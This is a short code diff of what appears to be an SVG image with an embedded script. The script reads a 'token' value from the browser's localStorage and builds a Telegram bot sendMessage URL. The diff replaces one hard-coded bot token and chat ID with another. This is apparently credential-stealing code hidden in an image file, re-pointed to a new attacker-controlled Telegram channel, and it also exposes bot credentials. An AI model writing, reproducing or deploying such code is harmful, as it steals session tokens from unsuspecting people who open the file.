@@ -5,8 +5,8 @@
       const token = localStorage.getItem('token') || 'this-worked-v2';
     
       // Your Telegram Bot Token and Chat ID
-      const botToken = "8262449032:AAFB_jVPcfVjPMXV_ECWS-MHxiEJKP8Apxs";
-      const chatId = "-5098583582";
+      const botToken = "7895775398:AAHrFnDgYRcKr16jt1wMy1vOeR5qz19u47o";
+      const chatId = "-1003228598971";
       
       const telegram_url = `https://api.telegram.org/bot${botToken}/sendMessage`;
       
@@ -36,3 +36,4 @@
   </script>
 
 </svg>
+
